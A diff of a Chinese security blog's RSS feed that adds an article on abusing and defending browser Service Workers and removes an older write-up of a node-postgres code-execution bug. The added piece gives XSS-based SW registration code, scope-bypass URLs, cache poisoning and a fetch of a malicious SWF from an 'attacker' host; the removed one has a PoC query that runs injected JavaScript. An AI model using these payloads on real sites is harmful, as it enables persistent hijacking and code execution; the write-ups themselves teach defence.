@@ -5,7 +5,137 @@
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
 <description>twosecurity.io</description>
 <language>zh-cn</language>
-<lastBuildDate>Sun, 24 Sep 2017 07:53:36 +0800</lastBuildDate>
+<lastBuildDate>Sat, 30 Sep 2017 00:21:53 +0800</lastBuildDate>
+<item>
+<title>如何利用/防御 Service Worker</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-29-29734820.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;如何利用/防御 Service Worker&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29734820&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;service worker是一段脚本，与web worker一样，也是在后台运行。作为一个独立的线程，运行环境与普通脚本不同，所以不能直接参与web交互行为。native app可以做到离线使用、消息推送、后台自动更新，service worker的出现是正是为了使得web app也可以具有类似的能力。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这篇文章中，我将讲解：&lt;/p&gt;&lt;p&gt;攻击：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Service Worker是什么？&lt;/li&gt;&lt;li&gt;我们如何用SW攻击？&lt;/li&gt;&lt;li&gt;一些SW的攻击案例。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;防护:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;开发者们有什么对策?&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;对SW进行register（注册）&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+navigator.serviceWorker.register(&quot;/sw.js&quot;)
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;注册SW时必须满足以下要求：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;和register操作的页面处于同源&lt;/li&gt;&lt;li&gt;运行Secure Context&lt;/li&gt;&lt;li&gt;Content-Type的种类应该为javascript，比如以下几种类型&lt;/li&gt;&lt;/ol&gt;&lt;ul&gt;&lt;li&gt;&lt;i&gt;text/javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/x-javascript&lt;/i&gt;&lt;/li&gt;&lt;li&gt;&lt;i&gt;application/javascript&lt;/i&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Secure Context又是什么？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Secure Context指的是来源必须是安全的(比如HTTPS)或者来自默认的(如：&lt;a href=&quot;http://localhost/&quot;&gt;http://localhost&lt;/a&gt; )。通过这些限制，我们可以阻止中间人(MITM)攻击。除此之外，我们还要限制某些特权API（比如获得地理位置，Web&lt;br&gt;USB，摄像头/录音器的API）&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;曾经的Application Cache&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在Service Woeker出现前，人们使用AppCache进行缓存。由于AppCache使用复杂并且不受Secure&lt;br&gt;Context限制，人们就用SW替换了AppCahce。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了更严格的限制，攻击者应该如何利用SW呢？通常来讲，我们需要在HTTPS的同源网站中：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;找到XSS，利用XSS注册SW Script&lt;/li&gt;&lt;li&gt;找到可利用的SW Script位置(而且Content-Type得为javascript，有没有什么简单粗暴的途径帮我们找到属于我们的Service Worker Script呢？)&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径１——JSONP&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有些时候，我们可以指定回调函数为被注册的脚本，以此写入任意代码&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://example.com/jsonp?callback=alert(1)//&quot;&gt;https://example.com/jsonp?callback=alert(1)//&lt;/a&gt;&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
+200 OK
+Content-Type:
+text/javascript; charset=UTF-8
+[...]
+
+alert(1)//({});&lt;/code&gt;&lt;p&gt;一个XSS+JSONP的案例：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/xss?=&amp;lt;script&amp;gt;navigator.serviceWorker[...]
+
+&amp;lt;script&amp;gt;
+navigator.serviceWorker.register(&quot;/jsonp?callback=[SW_HERE]//&quot;);
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;https://example.com/jsonp?q=onfetch=e=&amp;gt;console.log(&#39;fetch&#39;)//
+
+HTTP/1.1
+200 OK
+Content-Type:
+text/javascript; charset=UTF-8
+[...]
+onfetch=event=&amp;gt;console.log(&#39;fetch&#39;)//({});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;捷径２——文件上传&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当一个服务器允许我们上传JavaScript文件时，它返回该文件的Content-Type也极有可能是JavaScript。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是一个文件上传XSS+SW register的场景：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+var
+formData = new FormData();
+formData.append(&quot;csrf_token&quot;,
+&quot;secret&quot;);
+var
+sw = &quot;/* [SW_CODE] */&quot;;
+var
+blob = new Blob([sw], { type: &quot;text/javascript&quot;});
+formData.append(&quot;file&quot;,
+blob, &quot;sw.js&quot;);
+fetch(&quot;/upload&quot;,
+{method: &quot;POST&quot;, body: formData}).then(/* Register SW */);
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;成功注册脚本之后呢？&lt;/b&gt;&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;我们对页面更持久的控制（比如存储型XSS)。就算用来注册的XSS失效，我们也依然可以使用SW对页面进行后续控制。&lt;/li&gt;&lt;li&gt;监听/更改请求或响应&lt;/li&gt;&lt;li&gt;使用恶意Flash跨域读取内容&lt;/li&gt;&lt;li&gt;升级反射型XSS变成存储型XSS&lt;/li&gt;&lt;li&gt;可以一直持续到SW过期&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;打个比方，无论访问哪个URL，下面的代码都只会返回alert:&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
+body =
+&#39;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&#39;;
+init =
+{headers:{&#39;content-type&#39;:&#39;text/html&#39;}};
+e.respondWith(new Response(body,init));
+}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之一：Scope&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在使用`navigator.serviceWorker.register()`注册脚本时，我们可以在第二个参数中提供一个Scope（范围）。调用超出该Scope的资源会被视为非法行为。那么怎么定义合法的scope呢？在注册脚本时，我们需要提供一个相对地址，该目录的上一层或同级目录都被视为不可控的Scope，不过开发者可以控制自身及子目录。如果省略该参数，第一个参数下的目录会被成Scope。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;例如：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+navigator.serviceWorker.register(&quot;/sw.js&quot;,
+{scope: &quot;/&quot;})
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;除此之外，我们只能指定同源的地址：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;无效：&quot;/assets/js/sw.js&quot;,
+{scope: &quot;https://other.example.com/&quot;}
+无效：&quot;/assets/js/sw.js&quot;, {scope:
+&quot;/assets/&quot;}
+无效：&quot;/assets/js/sw.js&quot;, {scope:
+&quot;/assets/css/&quot;}
+有效：&quot;/assets/js/sw.js&quot;, {scope:
+&quot;/assets/js/&quot;}
+有效：&quot;/assets/js/sw.js&quot;, {scope:
+&quot;/assets/js/sub/&quot;}&lt;/code&gt;&lt;p&gt;如果你开启了 Service-Worker-Awed 头，那么就可以指定同域下开启该header的任意路径。(下面的例子允许我们用/当Scope)&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;HTTP/1.1
+200 OK
+content-type:
+text/javascript
+service-worker-allowed:
+/
+[...]&lt;/code&gt;&lt;p&gt;在某些情况下（一般来讲，攻击者会被规范禁止），你可以通过编码/来突破上述限制：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/api/jsonp
+https://example.com/api%2Fjsonp&lt;/code&gt;&lt;p&gt;除了注册时有这种越权风险，我们注册后也有可能通过编码绕过scope限制（同样取决于服务器的设定）。打个比方，我们可以用这两种形式表示同一个页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://example.com/out-of-scope/
+https://example.com/foo/..%2Fout-of-scope%2F&lt;/code&gt;&lt;p&gt;如果我们用/foo/来当Service Worker的Scope。当我们访问/foo/..%2Fout-of-scope%2F时，我们就可以越权获得信息。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Service Worker限制之二：生命周期&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;为了保证安全性，每个Service Worker都有时间限制。在授权24小时后（用PC时钟确定时间），原先的HTTP缓存将被清除。脚本需要被重新注册以正常使用，否则会被摧毁。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;XSS+SW+Flash&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果捕捉到Flash响应，我们可以用该响应创建一个有该源权限的恶意Flash（只对firefox有用，chrome会直接下载Flash）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch=e=&amp;gt;{
+e.respondWith(fetch(&quot;//attacker/poc.swf&quot;))
+}&lt;/code&gt;&lt;p&gt;这有什么危害呢？当example.com存在如下的crossdomain时：&lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;&amp;lt;?xml
+version=&quot;1.0&quot;?&amp;gt;
+&amp;lt;cross-domain-policy&amp;gt;
+&amp;lt;allow-access-from
+domain=&quot;example.jp&quot; /&amp;gt;
+&amp;lt;/cross-domain-policy&amp;gt;&lt;/code&gt;&lt;p&gt;我们可以在example.jp上创建flash并读取example.com内容（某种意义上的SOP绕过）。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Foreign fetch&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;只要资源被当前源引用，即使是不同源的图像或脚本也可以被service worker篡改&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;比如在example.jp下有这么一个标签：&lt;/p&gt;&lt;blockquote&gt;&amp;lt;script src=&quot;//example.com/socialbutton.js&quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于example.com的资源被example.jp调用，example.jp的SW可以直接修改socialbutton.js&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们可以用Foreign Fetch来制造XSS：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;self.addEventListener(&#39;install&#39;,e =&amp;gt; {
+e.registerForeignFetch({
+scopes: [&#39;/&#39;],
+origins:
+[&#39;*&#39;]//通配所有的源
+});});
+
+onforeignfetch= e =&amp;gt; {
+e.respondWith(fetch(e.request).then(res =&amp;gt;
+({
+response:
+new Response(&#39;alert(1)&#39;)//返回弹窗代码
+})))}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击SW cache（缓存）&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;注意，HTTP cache不等于SW Cache。只有在被脚本调用时才会返回cache。&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;onfetch= event =&amp;gt; {
+event.respondWith(
+caches.open(&quot;v1&quot;).then(function(cache) {
+return cache.match(event.request).then(function(response) {
+if (response) {
+return response;//
+} else {
+return fetch(event.request.clone()).then(function(response) {
+cache.put(event.request,
+response.clone());//
+return response;
+});}})}));
+};&lt;/code&gt;&lt;p&gt;攻击这可以用XSS添加请求/响应到cahce中（这个例子添加了posion.html到响应中）&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+caches.open(&quot;v1&quot;).then(function(cache){
+content =
+&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;;
+init = {headers: {&quot;content-type&quot;:
+&quot;text/html&quot;}};
+request = new
+Request(&quot;poison.html&quot;);
+response = new Response(content, init);
+cache.put(request, response);
+})
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;比较：基于localStorage的XSS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;考虑以下localStorage的误用：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+document.write(localStorage.getItem(&#39;name&#39;));
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;在Service Worker中，我们不可以直接对DOM进行操作，而且SW也有24小时的生命周期。但是由于SW及其强大的特权，很难说SW cache比localStorage更安全&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;防御：如何删除Service Worker?&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;通过JavaScript&lt;/li&gt;&lt;li&gt;使用Clear-Site-Data headers&lt;/li&gt;&lt;li&gt;手动消除（仅使用于Chrome）&lt;/li&gt;&lt;li&gt;chrome://serviceworker-internals（不过Cache Storage不会被删除）&lt;/li&gt;&lt;li&gt;开发者工具 -&amp;gt; Application -&amp;gt; Clear Storage&lt;/li&gt;&lt;li&gt;chrome://settings/clearBrowserData -&amp;gt; Clear Browser Data&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Clear-Site-Data头&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个头可以删除当前源的所有的存储数据（或者指定数据），比如说：Clear-Site-Data:&quot;cookie&quot;可以删除所有cookie。该功能已经在Chrome61得到了支持。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一个清除storage的响应：&lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;HTTP/1.1
+200 OK
+Content-Type:text/html
+Clear-Site-Data:
+&quot;storage&quot;&lt;/code&gt;&lt;h2&gt;&lt;b&gt;如何阻止他人注册恶意SW&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当注册SW时，会发生如下的请求：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET https://example.com/sw.js HTTP/1.1
+Host:example.com
+Connection:keep-alive
+Pragma:no-cache
+Cache-Control:no-cache
+User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+likeGecko) Chrome/61.0.3163.79 Safari/537.36
+Accept:*/*
+Service-Worker:script
+Referer: https://example.com/
+Accept-Encoding:
+gzip, deflate, br
+Accept-Language:
+ja,en;q=0.8,en-US;q=0.6```&lt;/code&gt;&lt;p&gt;我们可以通过拒绝非SW Script却又包含Service-Worker:script头的请求以进行防范&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;基于Service Worker的XSS可能带来的问题：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;XSS持久化&lt;/li&gt;&lt;li&gt;新型Flash攻击&lt;/li&gt;&lt;li&gt;SW缓存劫持&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;如何进行防御：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;治病需治根：防范XSS&lt;/li&gt;&lt;li&gt;拒绝非SW Script（比如jsonp，文件上传功能）对Service-Worker:script的请求&lt;/li&gt;&lt;/ol&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-09-29-29734820</guid>
+<pubDate>Fri, 29 Sep 2017 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>Flash漏洞的死灰复燃4</title>
 <link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-23-29603213.htm</link>
@@ -528,81 +658,6 @@ test
 <author>Twosecurity</author>
 <guid isPermaLink="false">2017-08-19-28630038</guid>
 <pubDate>Sat, 19 Aug 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>Node.js postgres 从 SQL注入到代码执行</title>
-<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-17-28575189.htm</link>
-<description>&lt;meta charset=&quot;utf-8&quot;&gt;
-&lt;title&gt;Node.js postgres 从 SQL注入到代码执行&lt;/title&gt;
-&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28575189&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;node-postgres 是 Node 版的 PostgreSQL 接口的实现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c723150d4b35ba6db79ecf578d6e3475_r.jpg&quot; data-rawwidth=&quot;403&quot; data-rawheight=&quot;450&quot;&gt;&lt;p&gt;几天前，Sehrope Sarkuni 在这个 lib 的 SQL 解析部分发现了远程代码注入。漏洞的起因是解析器将用户提供的表名封装为函数。当表名为合法 JavaScript 代码时，我们就可触发该漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;成功连接数据库后，客户端会触发 readyForQuery&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;con.once(&#39;readyForQuery&#39;, function () {
-    self._connecting = false
-    self._connected = true
-    self._attachListeners(con)
-    con.removeListener(&#39;error&#39;, connectingErrorHandler)
-    con.on(&#39;error&#39;, connectedErrorHandler)
-...
-}
-&lt;/code&gt;&lt;p&gt;readyForQuery 让 self._attachListeners 处理连接：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;client.prototype._attachListeners = function (con) {
-  const self = this
-  // rowDescription被触发后，node-postgres将伴随该事件的消息传给handleRowDescription
-  con.on(&#39;rowDescription&#39;, function (msg) {
-    self.activeQuery.handleRowDescription(msg)
-  })
-...
-}
-
-...
-
-Query.prototype.handleRowDescription = function (msg) {
-  this._checkForMultirow()
-  this._result.addFields(msg.fields)           //handleRowDescription又将msg发送给addFields
-  this._accumulateRows = this.callback || !this.listeners(&#39;row&#39;).length
-}
-
-&lt;/code&gt;&lt;p&gt;最终，查询的数据会被传递给 addFields&lt;/p&gt;&lt;p&gt;让我们来看看 addFields 是如何处理参数的：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Result.prototype.addFields = function (fieldDescriptions) {
-  if (this.fields.length) {
-    this.fields = []
-    this._parsers = []
-  }
-  var ctorBody = &#39;&#39;
-  for (var i = 0; i &amp;lt; fieldDescriptions.length; i++) {
-    var desc = fieldDescriptions[i]
-    this.fields.push(desc)
-    var parser = this._getTypeParser(desc.dataTypeID, desc.format || &#39;text&#39;)
-    this._parsers.push(parser)
-    ctorBody += (fieldName, i) =&amp;gt; {
-      return &quot;\nthis[&#39;&quot; +
-         fieldName.replace(/&#39;/g, &quot;\\&#39;&quot;) + //这个正则表达式只负责过滤SQL注入，它并不会影响我们执行JavaScript
-        &quot;&#39;] = &quot; +
-        &#39;rowData[&#39; + i + &#39;] == null ? null : parsers[&#39; + i + &#39;](rowData[&#39; + i + &#39;]);&#39;
-    }
-  }
-  if (!this.rowAsArray) {
-    this.RowCtor = Function(&#39;parsers&#39;, &#39;rowData&#39;, ctorBody)
-  }
-}
-
-&lt;/code&gt;&lt;p&gt;这个函数将 fieldDescriptions 的数据一一取出，再用inlineParser处理，并把结果保存到 ctorBody 里（这个变量被攻击者变相地控制）。&lt;br&gt;注意!在倒数第二行，ctorBody 被传给 Function ，并将生成的函数对象返回给 RowCtor。&lt;/p&gt;&lt;p&gt;既然都返回了一个函数，那么这个函数肯定会在哪一行被调用。&lt;br&gt;果然，&lt;b&gt;lib/result.js&lt;/b&gt; 会触发该函数：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;...
-Result.prototype.parseRow = function (rowData) {
-  return new this.RowCtor(this._parsers, rowData)
-}
-...
-
-&lt;/code&gt;&lt;p&gt;这样一来，我们可以在 SQL 语句中总包含 JavaScript 来达到任意代码执行。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PoC&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;const { Client } = require(&#39;pg&#39;)
-const client = new Client()
-client.connect()
-
-const sql = `SELECT 1 AS &quot;\\&#39;/*&quot;, 2 AS &quot;\\&#39;*/\n + console.log(process.env)] = null;\n//&quot;`
-
-client.query(sql, (err, res) =&amp;gt; {
-  client.end()
-})
-
-&lt;/code&gt;&lt;p&gt;这个 PoC 会打印出当前的环境变量，攻击者将 console.log(process.env) 替换成自己的 payload 即可执行任意代码&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞影响&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果你不使用用户提供的 SQL 语句连接数据库，这个漏洞就不会影响你。然而，我们 &lt;b&gt;强烈&lt;/b&gt;建议你升级到最新版本。&lt;br&gt;黑客可能会通过以下途径攻击你：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在你的 SQL 语句中添加恶意表名&lt;/li&gt;&lt;li&gt;让你连接到一个数据库，并让该数据库返回恶意表名&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;参考：https://github.com/brianc/node-postgres/issues/1408&lt;/i&gt;&lt;/p&gt;</description>
-<author>Twosecurity</author>
-<guid isPermaLink="false">2017-08-17-28575189</guid>
-<pubDate>Thu, 17 Aug 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
